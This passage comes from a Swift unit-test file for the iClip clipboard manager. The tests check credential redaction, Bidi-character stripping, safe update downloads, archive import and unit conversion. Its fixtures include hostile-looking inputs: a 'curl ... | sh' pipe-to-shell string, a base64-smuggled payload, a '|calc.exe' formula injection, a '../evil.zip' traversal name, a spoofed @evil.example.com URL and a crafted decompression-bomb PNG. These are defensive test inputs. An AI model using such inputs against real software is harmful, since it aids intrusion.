        let publicShareURL = try XCTUnwrap(URLTrackingCleaner.sanitizeURLForPublicShare(presignedS3))
        XCTAssertEqual(publicShareURL, "https://docs.example.com/report/q4?id=42#summary")
        // 纯追踪无鉴权链接不触发去鉴权净链（交由普通净链处理）
        XCTAssertNil(URLTrackingCleaner.sanitizeURLForPublicShare("https://docs.example.com/report/q4?id=42&utm_source=feishu"))

        // 3. 验证 Alfred JSON、TextExpander JSON 与 Obsidian/Notion Markdown 二级标题常用语笔记无损迁入
        let alfredJSON = """
        {"alfredsnippet":{"snippet":"git status -sb","uid":"u1","name":"Git 简明状态","keyword":";gs"}}
        """
        let alfredParsed = try XCTUnwrap(UniversalCompetitorImporter.parseExternalData(Data(alfredJSON.utf8), fileExtensionHint: "json"))
        XCTAssertEqual(alfredParsed.formatName, "Alfred 常用语")
        XCTAssertEqual(alfredParsed.entries.first?.alias, "Git 简明状态")
        XCTAssertEqual(alfredParsed.entries.first?.text, "git status -sb")

        let teJSON = """
        {"snippetPlists":[{"abbreviation":";addr","label":"公司收件地址","plainText":"深圳市南山区科技园 88 号"}]}
        """
        let teParsed = try XCTUnwrap(UniversalCompetitorImporter.parseExternalData(Data(teJSON.utf8), fileExtensionHint: "json"))
        XCTAssertEqual(teParsed.formatName, "TextExpander 常用语")
        XCTAssertEqual(teParsed.entries.first?.alias, "公司收件地址")

        let obsidianMD = """
        ---
        tags: [snippets]
        ---
        # 研发与商务高频话术库

        ## 开票抬头信息
        名称：星辰智造科技有限公司
        税号：91440300MA5FX23P8L

        ### `Docker 日志排障`
        ```bash
        docker compose logs -f --tail=100 app
        ```
        """
        let mdParsed = try XCTUnwrap(UniversalCompetitorImporter.parseExternalData(Data(obsidianMD.utf8), fileExtensionHint: "md"))
        XCTAssertEqual(mdParsed.formatName, "Markdown 常用语笔记")
        XCTAssertEqual(mdParsed.entries.count, 2)
        XCTAssertEqual(mdParsed.entries[0].alias, "开票抬头信息")
        XCTAssertTrue(mdParsed.entries[0].text.contains("91440300MA5FX23P8L"))
        XCTAssertEqual(mdParsed.entries[1].alias, "Docker 日志排障")
        XCTAssertEqual(mdParsed.entries[1].text, "docker compose logs -f --tail=100 app")

        // 4. 验证拖拽暂存缓冲清理幂等安全
        ClipboardStore.shared.clearTransientDragImageBuffers()
        XCTAssertNil(ClipboardStore.shared.lastImportedDragPNGData)
        XCTAssertNil(ClipboardStore.shared.lastImportedDragPreviewCGImage)
    }

    // MARK: - 55. cURL 安全复现瘦身、容错 JSONC 净化与 `curl -u/-b` 凭据脱敏测试

    @MainActor
    func testCurlSafeReproductionSanitizerJSONCCleanerAndInlineCurlCredentialVeil() throws {
        // 1. 验证 Chrome `Copy as cURL` 剥除浏览器指纹噪音头并将 Cookie / Authorization / -u 替换为安全占位符
        let fakeBearer = "eyJhbGciOiJIUzI1NiJ9." + "eyJzdWIiOiJ1c2VyOTkifQ." + "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        let dirtyCurl = """
        curl 'https://api.example.com/v1/orders?page=1&utm_source=chrome' \\
          -H 'sec-ch-ua: "Chromium";v="128"' \\
          -H 'sec-fetch-site: same-origin' \\
          -H 'user-agent: Mozilla/5.0' \\
          -H 'accept: application/json' \\
          -H 'authorization: Bearer \(fakeBearer)' \\
          -b 'sid=real_session_secret_8899' \\
          --compressed
        """
        let curlRes = try XCTUnwrap(CurlAndJSONCSanitizer.sanitizeCurlForReproduction(dirtyCurl))
        XCTAssertGreaterThanOrEqual(curlRes.redactedSecrets, 2)
        XCTAssertGreaterThanOrEqual(curlRes.removedNoiseHeaders, 3)
        XCTAssertFalse(curlRes.cleanedCurl.contains(fakeBearer))
        XCTAssertFalse(curlRes.cleanedCurl.contains("real_session_secret_8899"))
        XCTAssertFalse(curlRes.cleanedCurl.contains("sec-ch-ua"))
        XCTAssertTrue(curlRes.cleanedCurl.contains("Bearer $AUTH_TOKEN"))
        XCTAssertTrue(curlRes.cleanedCurl.contains("$REDACTED_COOKIE"))
        XCTAssertTrue(curlRes.cleanedCurl.contains("https://api.example.com/v1/orders?page=1"))

        // 验证 `curl -u user:pass` 内联账密敏感分类与掩码
        let basicCurl = "curl -u admin:" + "ProdPass#2026 https://internal.corp/health"
        XCTAssertEqual(SensitiveCredentialVeil.classify(basicCurl), .connectionSecret)
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(basicCurl).contains("ProdPass#2026"))

        // 2. 验证带 `//`、`/* */` 注释与尾随逗号的 JSONC 精准净化为标准合法 JSON（且严格保护字符串内 `https://` 不被误剥）
        let rawJSONC = """
        // 服务网关配置
        {
          "endpoint": "https://api.example.com/v1/*keep*/", // 字符串内双斜杠与块注释符必须完整保留
          /* 超时毫秒数 */
          "timeoutMs": 3000,
          "features": ["auth", "retry",],
        }
        """
        let strictJSON = try XCTUnwrap(CurlAndJSONCSanitizer.cleanJSONCToStrictJSON(rawJSONC))
        let parsedObj = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(strictJSON.utf8)) as? [String: Any])
        XCTAssertEqual(parsedObj["endpoint"] as? String, "https://api.example.com/v1/*keep*/")
        XCTAssertEqual(parsedObj["timeoutMs"] as? Int, 3000)
        XCTAssertEqual(parsedObj["features"] as? [String], ["auth", "retry"])

        // 原本已是合法 JSON 的不触发 JSONC 净化
        XCTAssertNil(CurlAndJSONCSanitizer.cleanJSONCToStrictJSON(#"{"ok": true}"#))
    }

    // MARK: - 56. 惰性拖拽零同步写盘、归档 OCR 防 Bidi 投毒、乱码转义安全解码与多行名单去重测试

    @MainActor
    func testLazyDragZeroEagerDiskWriteArchiveOCRPoisonGuardEscapeDecoderAndLineDedup() throws {
        // 1. 验证 Unicode `\uXXXX` 中文转义（含暗藏 `\u202e` Bidi 木马符自动剥离）、URL `%XX` 与 HTML 实体解码
        let unicodeEscaped = #"errmsg: \u8ba2\u5355\u652f\u4ed8\u5931\u8d25\u202eevil"#
        let decUni = try XCTUnwrap(UniversalEscapeDecoder.decodeIfApplicable(unicodeEscaped))
        XCTAssertTrue(decUni.decodedText.contains("订单支付失败"))
        XCTAssertFalse(decUni.decodedText.contains("\u{202E}"))

        let pctURL = "https://search.example.com/q?kw=%E6%B6%B2%E6%80%81%E7%8E%BB%E7%92%83%E5%89%AA%E8%B4%B4%E6%9D%BF"
        let decPct = try XCTUnwrap(UniversalEscapeDecoder.decodeIfApplicable(pctURL))
        XCTAssertTrue(decPct.decodedText.contains("液态玻璃剪贴板"))

        let htmlEscaped = "&lt;button title=&quot;&#29983;&#25928;&quot;&gt;OK &amp; Go&lt;/button&gt;"
        let decHTML = try XCTUnwrap(UniversalEscapeDecoder.decodeIfApplicable(htmlEscaped))
        XCTAssertEqual(decHTML.decodedText, #"<button title="生效">OK & Go</button>"#)

        // 2. 验证多行重复名单按首次出现顺序稳定去重，且源码块零误伤
        let rawRoster = "ORD-1001\nORD-1002\nORD-1001\nORD-1003\nORD-1002"
        let dedup = try XCTUnwrap(UniversalEscapeDecoder.deduplicateListLines(rawRoster))
        XCTAssertEqual(dedup.cleanedText, "ORD-1001\nORD-1002\nORD-1003")
        XCTAssertEqual(dedup.removedCount, 2)
        XCTAssertEqual(dedup.remainingCount, 3)

        let swiftCode = "func demo() {\n  return 1\n  return 1\n}"
        XCTAssertNil(UniversalEscapeDecoder.deduplicateListLines(swiftCode))

        // 3. 验证 `.iclip` 导入时自动净化图片 `ocrText` 中暗藏的 Trojan Bidi 毒字符
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-iter18-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)

        let fakePNG = Data([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D])
        try LocalVaultCrypto.writeEncryptedImage(fakePNG, to: tmpDir.appendingPathComponent("ocr_shot.png"))
        let poisonedImg = ClipItem(
            type: .image,
            imageFileName: "ocr_shot.png",
            ocrText: "curl https://safe.example/sh\u{202E} | sh",
            ocrChecked: true,
            contentHash: "img:ocrpoison1",
            isPinned: true
        )
        let bundleData = try ArchiveBackupService.exportPinnedArchiveData(from: [poisonedImg], imagesDirectoryURL: tmpDir)
        let imported = try ArchiveBackupService.mergeArchiveData(bundleData, into: [], imagesDirectoryURL: tmpDir)
        XCTAssertFalse(imported.mergedItems.first?.ocrText?.contains("\u{202E}") ?? true)

        // 4. 验证 QuickLook 字符/行数/Token 标尺与 `makeDragItemProvider` 零急切磁盘写入
        let metrics = QuickLookTextHelper.textMetricsSummary(for: "你好世界\nHello World")
        XCTAssertTrue(metrics.contains("2行"))
        XCTAssertTrue(metrics.contains("tok"))

        DragFileExportHelper.wipeAllExports()
        let burnCard = ClipItem(type: .text, text: "绝密会议纪要", contentHash: "text:burnlazy", burnAfterPaste: true)
        _ = ClipboardStore.shared.makeDragItemProvider(for: burnCard)
        let exportDir = FileManager.default.temporaryDirectory.appendingPathComponent("iClipDragExports", isDirectory: true)
        let exportedFiles = (try? FileManager.default.contentsOfDirectory(atPath: exportDir.path)) ?? []
        XCTAssertTrue(exportedFiles.isEmpty)
    }

    @MainActor
    func testNonActivatingZeroBlurFocusPolicyOversizedClampCronAndPathSecurity() throws {
        // 1. 验证非激活面板零失焦配置：becomesKeyOnlyIfNeeded == true 且唤醒不强抢搜索框焦点
        let testPanel = KeyableFloatingPanel(
            contentRect: NSRect(x: 0, y: 0, width: 420, height: 560),
            styleMask: [.nonactivatingPanel, .borderless],
            backing: .buffered,
            defer: true
        )
        XCTAssertTrue(testPanel.styleMask.contains(.nonactivatingPanel))
        XCTAssertTrue(testPanel.becomesKeyOnlyIfNeeded)
        XCTAssertTrue(testPanel.canBecomeKey)
        XCTAssertFalse(testPanel.canBecomeMain)

        // 导航键/快捷键不触发盲搜获焦，普通字符键触发盲搜获焦，且已激活宿主应用粘贴时不重复 activate
        XCTAssertFalse(PanelFocusPreservationPolicy.shouldBeginSearchTyping(
            keyCode: 125, flags: [], charactersIgnoringModifiers: "\u{F701}", showSettings: false, showQuickLook: false
        ))
        XCTAssertFalse(PanelFocusPreservationPolicy.shouldBeginSearchTyping(
            keyCode: 36, flags: [], charactersIgnoringModifiers: "\r", showSettings: false, showQuickLook: false
        ))
        XCTAssertTrue(PanelFocusPreservationPolicy.shouldBeginSearchTyping(
            keyCode: 0, flags: [], charactersIgnoringModifiers: "a", showSettings: false, showQuickLook: false
        ))
        XCTAssertFalse(PanelFocusPreservationPolicy.shouldActivatePreviousApp(isPreviousAppActive: true))
        XCTAssertTrue(PanelFocusPreservationPolicy.shouldActivatePreviousApp(isPreviousAppActive: false))

        // 2. 验证超大文本 UTF-8 多字节汉字/Emoji 标量边界安全截断
        let multiByte = "微信搜索🚀测试文本"
        let clamped = ClipboardStore.clampOversizedTextForStorage(multiByte, maxUTF8Bytes: 15)
        XCTAssertLessThanOrEqual(clamped.utf8.count, 15)
        XCTAssertEqual(clamped, "微信搜索")

        // 3. 验证新型云/AI 密钥（OpenRouter / Databricks / Grafana / Resend）离线脱敏保护
        let openRouterKey = "sk-or-v1-" + "abcdef0123456789abcdef0123456789abcdef0123456789"
        XCTAssertEqual(SensitiveCredentialVeil.classify(openRouterKey), .apiKey)
        let databricksPat = "dapi" + "0123456789abcdef0123456789abcdef"
        XCTAssertEqual(SensitiveCredentialVeil.classify(databricksPat), .apiKey)

        // 4. 验证离线 5 段 Cron 自然中文直译（防误伤普通数字串）与跨平台路径斜杠/终端转义
        let cron = try XCTUnwrap(CronAndPathHelper.explainCronExpression("*/15 9-18 * * 1-5"))
        XCTAssertTrue(cron.shortSummary.contains("工作日"))
        XCTAssertNil(CronAndPathHelper.explainCronExpression("1 2 3 4 5"))

        let winPath = try XCTUnwrap(CronAndPathHelper.analyzePathAction(#"C:\Users\dev\my project\config.json"#))
        XCTAssertEqual(winPath.id, "path-win-to-slash")
        XCTAssertEqual(winPath.resultText, "C:/Users/dev/my project/config.json")

        let posixSpacePath = try XCTUnwrap(CronAndPathHelper.analyzePathAction("/Users/dev/My Secret Folder/a'b.txt"))
        XCTAssertEqual(posixSpacePath.id, "path-shell-quote")
        XCTAssertEqual(posixSpacePath.resultText, "'/Users/dev/My Secret Folder/a'\\''b.txt'")
    }

    @MainActor
    func testRedisEmptyUserURIStaleOTAPruneBase64PoisonGuardAndStripMarkdown() throws {
        // 1. 验证无用户名 Redis 连接串（redis://:pw@host / rediss://）识别、脱敏与双向替身回填
        let redisNoUser = "redis://:prod_cache_pw_2026@10.0.8.12:6379/0"
        XCTAssertEqual(SensitiveCredentialVeil.classify(redisNoUser), .connectionSecret)
        let redactedRedis = SensitiveCredentialVeil.redactForExternalSharing(redisNoUser)
        XCTAssertFalse(redactedRedis.contains("prod_cache_pw_2026"))
        XCTAssertTrue(redactedRedis.contains("***REDACTED***"))

        ReversiblePrivacyTwin.wipeAll()
        let twinMasked = try XCTUnwrap(ReversiblePrivacyTwin.maskWithTwins("连接失败：\(redisNoUser)"))
        XCTAssertFalse(twinMasked.maskedText.contains("prod_cache_pw_2026"))
        let restored = try XCTUnwrap(ReversiblePrivacyTwin.inspectRestorableTwins(in: twinMasked.maskedText))
        XCTAssertTrue(restored.restoredText.contains("prod_cache_pw_2026"))
        ReversiblePrivacyTwin.wipeAll()

        // 2. 验证过期 LocalOTA 版本包自动清理，同版本缓存保留
        let otaDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-ota-test-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: otaDir) }
        try FileManager.default.createDirectory(at: otaDir, withIntermediateDirectories: true)
        try "2.5.0".write(to: otaDir.appendingPathComponent("VERSION"), atomically: true, encoding: .utf8)
        try Data([0x50, 0x4B]).write(to: otaDir.appendingPathComponent("iClip-Dev-macOS.zip"))
        UpdateManager.pruneStaleLocalOTACache(currentVersion: "2.6.0", localOTADirectoryOverride: otaDir)
        XCTAssertFalse(FileManager.default.fileExists(atPath: otaDir.path))

        // 3. 验证 Base64 解码内联剥除暗藏 U+202E Trojan Bidi 木马符（防 Base64 Smuggling）
        #if !ICLIP_EDITION_FLOW
        let smuggledRaw = "echo safe\u{202E}evil_payload"
        let smuggledB64 = Data(smuggledRaw.utf8).base64EncodedString()
        let b64Item = ClipItem(type: .text, text: smuggledB64, contentHash: "text:b64poison")
        let snap = SemanticEngine.analyze(b64Item)
        let b64Act = try XCTUnwrap(snap.actions.first(where: { $0.id == "base64-decode" }))
        XCTAssertFalse(b64Act.resultText.contains("\u{202E}"))
        XCTAssertTrue(b64Act.isSecurityAction)
        #endif

        // 4. 验证 AI 回复「去 Markdown 纯文本」（剥除 ###、**加粗**、[链接](url)、任务框并保护算式乘号）
        let aiMarkdown = """
        ### 一、版本发布结论
        - [x] **核心优化**：已完成 `零失焦唤醒` 重构
        - [ ] 查看 [线上地址](https://app.webfooo.com/iClip)
        算式校验：2 * 3 * 4 = 24
        """
        let docActions = DocumentTypographyEngine.analyze(aiMarkdown)
        let stripAct = try XCTUnwrap(docActions.first(where: { $0.id == "doc-strip-markdown" }))
        XCTAssertFalse(stripAct.resultText.contains("###"))
        XCTAssertFalse(stripAct.resultText.contains("**"))
        XCTAssertTrue(stripAct.resultText.contains("☑ 核心优化：已完成 零失焦唤醒 重构"))
        XCTAssertTrue(stripAct.resultText.contains("☐ 查看 线上地址 (https://app.webfooo.com/iClip)"))
        XCTAssertTrue(stripAct.resultText.contains("2 * 3 * 4 = 24"))

        // 5. 验证单段无冒号 HTTPS Git Token URL、`.env` *_TOKEN / SIGNING_KEY、Azure AccountKey/SAS 脱敏与 SSH URL userinfo 替身保护
        let gitSingleTokenURL = "https://oauth9f8a7b6c5d4e3f2a1b0c9988@git.internal.corp/platform/core.git"
        XCTAssertEqual(SensitiveCredentialVeil.classify(gitSingleTokenURL), .connectionSecret)
        let redactedGit = SensitiveCredentialVeil.redactForExternalSharing(gitSingleTokenURL)
        XCTAssertFalse(redactedGit.contains("oauth9f8a7b6c5d4e3f2a1b0c9988"))
        XCTAssertTrue(redactedGit.contains("https://***REDACTED***@git.internal.corp"))

        let envTokenBlock = "VERCEL_TOKEN=vcp_alpha998877665544\nJWT_SIGNING_KEY=hmac_prod_key_2026_secure"
        XCTAssertEqual(SensitiveCredentialVeil.classify(envTokenBlock), .connectionSecret)
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(envTokenBlock).contains("vcp_alpha998877665544"))
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(envTokenBlock).contains("hmac_prod_key_2026_secure"))

        let azureConn = "DefaultEndpointsProtocol=https;AccountName=prodstore;AccountKey=QmFzZTY0QXp1cmVLZXlTYW1wbGUxMjM0NTY3ODkw==;EndpointSuffix=core.windows.net"
        let azureSAS = "https://prodstore.blob.core.windows.net/docs/q4.pdf?sv=2022-11-02&sp=r&sig=AbCdEfGhIjKlMnOpQrStUvWxYz0123456789%2B%3D"
        XCTAssertEqual(SensitiveCredentialVeil.classify(azureConn), .connectionSecret)
        XCTAssertEqual(SensitiveCredentialVeil.classify(azureSAS), .connectionSecret)
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(azureConn).contains("QmFzZTY0QXp1cmVLZXlTYW1wbGUxMjM0NTY3ODkw=="))
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(azureSAS).contains("AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"))

        ReversiblePrivacyTwin.wipeAll()
        let sshAndToken = "git clone ssh://git@github.com/org/repo.git && git pull \(gitSingleTokenURL) && notify ops@company.com"
        let twinRes2 = try XCTUnwrap(ReversiblePrivacyTwin.maskWithTwins(sshAndToken))
        XCTAssertTrue(twinRes2.maskedText.contains("ssh://git@github.com/org/repo.git"))
        XCTAssertTrue(twinRes2.maskedText.contains("@git.internal.corp/platform/core.git"))
        XCTAssertFalse(twinRes2.maskedText.contains("oauth9f8a7b6c5d4e3f2a1b0c9988"))
        XCTAssertFalse(twinRes2.maskedText.contains("ops@company.com"))
        let restored2 = try XCTUnwrap(ReversiblePrivacyTwin.inspectRestorableTwins(in: twinRes2.maskedText))
        XCTAssertEqual(restored2.restoredText, sshAndToken)
        ReversiblePrivacyTwin.wipeAll()

        // 6. 第 23 轮自省：验证 OTA 原生 `sha256:` 摘要解析、URL userinfo/端口欺骗拦截与多链接段落「提取 N 条净链」
        let sampleDigest = "af1c4fe04e28341be56315ba7a9a671c4f4d6afed4c2abed2f383f171687aedb"
        XCTAssertEqual(
            UpdateManager.parseExpectedSHA256(
                assetDigest: "sha256:\(sampleDigest.uppercased())",
                releaseBody: nil,
                assetName: "iClip-Dev-macOS.zip"
            ),
            sampleDigest
        )
        XCTAssertTrue(UpdateManager.isSafeAssetFileName("iClip-Dev-macOS.zip"))
        XCTAssertFalse(UpdateManager.isSafeAssetFileName("../evil.zip"))
        XCTAssertTrue(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "https://github-releases.githubusercontent.com/pkg.zip")!))
        XCTAssertFalse(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "https://github.com@evil.example.com/pkg.zip")!))
        XCTAssertFalse(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "https://app.webfooo.com:8443/pkg.zip")!))

        let messyLinksNote = """
        本周竞品与资料汇总：
        1）官网地址 https://app.webfooo.com/iClip?utm_source=wechat&spm=1001.2026，建议收藏；
        2）开源仓库（https://github.com/fanaruto/iClip?utm_medium=social）
        3）重复贴一次 https://app.webfooo.com/iClip?utm_source=feishu 方便核对。
        """
        let cleanURLs = SmartFieldExtractor.extractUniqueCleanURLs(messyLinksNote)
        XCTAssertEqual(cleanURLs, [
            "https://app.webfooo.com/iClip",
            "https://github.com/fanaruto/iClip"
        ])

        // 7. 第 24 轮自省：验证 `.iclip` 导入防伪造 contentHash 碰撞与已有条目 Bidi 清洗、Flow/Dev `{{clip_redacted}}` 邮箱/IP 一致性及离线全能单位直算
        let expectedLocalHash = "text:" + SHA256.hash(data: Data("生产跳板机守则".utf8)).map { String(format: "%02x", $0) }.joined()
        let localItem = ClipItem(type: .text, text: "生产跳板机守则", contentHash: expectedLocalHash, isPinned: true)
        let spoofJSON = """
        {
          "format": "com.qingjian.iclip.archive",
          "schemaVersion": 1,
          "appVersion": "2.7.0",
          "exportedEdition": "dev",
          "exportedAt": "2026-11-24T08:00:00Z",
          "entries": [
            {
              "type": "text",
              "text": "攻击者伪造的其他文本",
              "contentHash": "\(localItem.contentHash)",
              "createdAt": "2026-11-24T08:00:00Z",
              "customAlias": "正常备注\\u202eevil"
            },
            {
              "type": "text",
              "text": "生产跳板机守则",
              "contentHash": "\(localItem.contentHash)",
              "createdAt": "2026-11-24T08:00:00Z",
              "customAlias": "跳板机备注\\u202eevil"
            }
          ]
        }
        """
        let tmpImgDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-arch24-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tmpImgDir) }
        let (merged24, _) = try ArchiveBackupService.mergeArchiveData(Data(spoofJSON.utf8), into: [localItem], imagesDirectoryURL: tmpImgDir)
        XCTAssertEqual(merged24.count, 2)
        XCTAssertFalse(merged24[0].customAlias?.contains("\u{202E}") ?? true)
        XCTAssertNotEqual(merged24[1].contentHash, localItem.contentHash)

        let tplRendered = SnippetTemplateEngine.render(
            template: "排障上下文：{{clip_redacted}}",
            latestContextText: "节点 192.168.10.25 告警，值班 alice@corp.com 手机 13812345678"
        )
        XCTAssertFalse(tplRendered.contains("192.168.10.25"))
        XCTAssertFalse(tplRendered.contains("alice@corp.com"))
        XCTAssertFalse(tplRendered.contains("13812345678"))

        XCTAssertEqual(InstantMathEvaluator.evaluate("2048 mb")?.plainValue, "2 GB")
        XCTAssertEqual(InstantMathEvaluator.evaluate("1.5 tb to gb")?.plainValue, "1536 GB")
        XCTAssertEqual(InstantMathEvaluator.evaluate("98.6 °F")?.plainValue, "37 °C")
        XCTAssertEqual(InstantMathEvaluator.evaluate("180 min")?.plainValue, "3 h")
        XCTAssertNil(InstantMathEvaluator.evaluate("3f"))
        XCTAssertNil(InstantMathEvaluator.evaluate("100c"))

        // 8. 第 25 轮自省：验证 OWASP `|` 公式注入转义与 AI 混排文字中内嵌 Markdown 表格自动寻址直粘 Excel
        XCTAssertEqual(TableBridgeEngine.sanitizeSpreadsheetCell("|calc.exe"), "'|calc.exe")
        let aiMixedReply = """
        好的，为您整理了本季度的供应商报价对比如下：

        | 供应商 | 单价 | 交付周期 |
        | :--- | :---: | ---: |
        | 方案甲 | 1280 | 3个工作日 |
        | 方案乙 | 960 | 5个工作日 |

        建议综合考虑交付时效选择方案甲。
        """
        let tblActs = TableBridgeEngine.analyze(aiMixedReply)
        let excelAct = try XCTUnwrap(tblActs.first(where: { $0.id == "tbl-md-to-excel" }))
        XCTAssertTrue(excelAct.resultText.contains("供应商\t单价\t交付周期"))
        XCTAssertTrue(excelAct.resultText.contains("方案甲\t1280\t3个工作日"))
        XCTAssertFalse(excelAct.resultText.contains("建议综合考虑"))

        // 验证 CWE-409 压缩炸弹（50000×50000 伪造 PNG IHDR）零像素解码拦截
        var bombPNG = Data([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
        bombPNG.append(contentsOf: [0x00, 0x00, 0x00, 0x0D]) // IHDR length = 13
        bombPNG.append(contentsOf: [0x49, 0x48, 0x44, 0x52]) // "IHDR"
        bombPNG.append(contentsOf: [0x00, 0x00, 0xC3, 0x50]) // width = 50000
        bombPNG.append(contentsOf: [0x00, 0x00, 0xC3, 0x50]) // height = 50000
        bombPNG.append(contentsOf: [0x08, 0x06, 0x00, 0x00, 0x00]) // 8-bit RGBA
        bombPNG.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // CRC placeholder
        XCTAssertFalse(ImageStudioEngine.hasSafeImageDimensions(in: bombPNG))
        XCTAssertNil(ImageStudioEngine.renderAppleMockupFrame(from: bombPNG))

        // 9. 第 26 轮自省：验证单行 GCP JSON 私钥防肩窥零泄露与脱敏不断行、`0600` 防符号链接覆盖、Tailscale `tskey-` 识别及竖列 ↔ 逗号/SQL IN 双向秒转
        let gcpOneLineJSON = #"{"type":"service_account","project_id":"demo","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQSecretPayload9988\n-----END PRIVATE KEY-----\n"}"#
        let veiledGCP = SensitiveCredentialVeil.veiledPreview(for: gcpOneLineJSON)
        XCTAssertFalse(veiledGCP.contains("MIIEvgIBADAN"))
        XCTAssertFalse(veiledGCP.contains("SecretPayload9988"))
        let redactedGCP = SensitiveCredentialVeil.redactForExternalSharing(gcpOneLineJSON)
        XCTAssertFalse(redactedGCP.contains("\n")) // 保持单行合法 JSON 不断行
        XCTAssertNotNil(try? JSONSerialization.jsonObject(with: Data(redactedGCP.utf8)))

        let tailscaleKey = "tskey-auth-k99887766CNTRL-aabbccddeeff1122334455"
        XCTAssertEqual(SensitiveCredentialVeil.classify(tailscaleKey), .apiKey)
        XCTAssertFalse(SensitiveCredentialVeil.redactForExternalSharing(tailscaleKey).contains("aabbccddeeff1122334455"))

        // 验证 writeProtectedFile 拒绝覆盖恶意符号链接（CWE-59）且权限严格为 0600
        let symDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-sym26-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: symDir) }
        try FileManager.default.createDirectory(at: symDir, withIntermediateDirectories: true)
        let victimURL = symDir.appendingPathComponent("victim.txt")
        let linkURL = symDir.appendingPathComponent("link.json")
        let normalURL = symDir.appendingPathComponent("vault.bin")
        try "SAFE_ORIGINAL".write(to: victimURL, atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(at: linkURL, withDestinationURL: victimURL)
        XCTAssertThrowsError(try LocalVaultCrypto.writeProtectedFile(Data("EVIL".utf8), to: linkURL))
        XCTAssertEqual(try String(contentsOf: victimURL, encoding: .utf8), "SAFE_ORIGINAL")
        try LocalVaultCrypto.writeProtectedFile(Data("SECRET_VAULT".utf8), to: normalURL)
        let perms = (try FileManager.default.attributesOfItem(atPath: normalURL.path)[.posixPermissions] as? NSNumber)?.intValue
        XCTAssertEqual(perms, 0o600)

        // 验证超界 `ICLPMSG1:` 伪造载荷 O(1) 拒绝（>96000 字符）
        let oversizedCapsule = "ICLPMSG1:" + String(repeating: "A", count: 100_000)
        XCTAssertFalse(SecretCapsuleMessenger.containsCapsule(oversizedCapsule))
        XCTAssertNil(SecretCapsuleMessenger.openCapsule(in: oversizedCapsule, passphrase: "test"))

        // 验证竖列单号 -> 逗号单行 & SQL IN，以及顿号单行 -> 竖列（且豁免 1,234,567,890 千分位数字）
        let orderColumn = "ORD20261101\nORD20261102\nORD20261103"
        let batchActs = UniversalEscapeDecoder.analyzeListBatchConversion(orderColumn, includeSQLIn: true)
        XCTAssertEqual(batchActs.first(where: { $0.id == "list-join-comma" })?.resultText, "ORD20261101, ORD20261102, ORD20261103")
        XCTAssertEqual(batchActs.first(where: { $0.id == "list-join-sql-in" })?.resultText, "('ORD20261101', 'ORD20261102', 'ORD20261103')")

        let inlineNames = "陈伟峰、林晓明、张思远、王梓涵"
        let splitActs = UniversalEscapeDecoder.analyzeListBatchConversion(inlineNames, includeSQLIn: false)
        XCTAssertEqual(splitActs.first?.resultText, "陈伟峰\n林晓明\n张思远\n王梓涵")
        XCTAssertTrue(UniversalEscapeDecoder.analyzeListBatchConversion("1,234,567,890", includeSQLIn: true).isEmpty)
    }
}
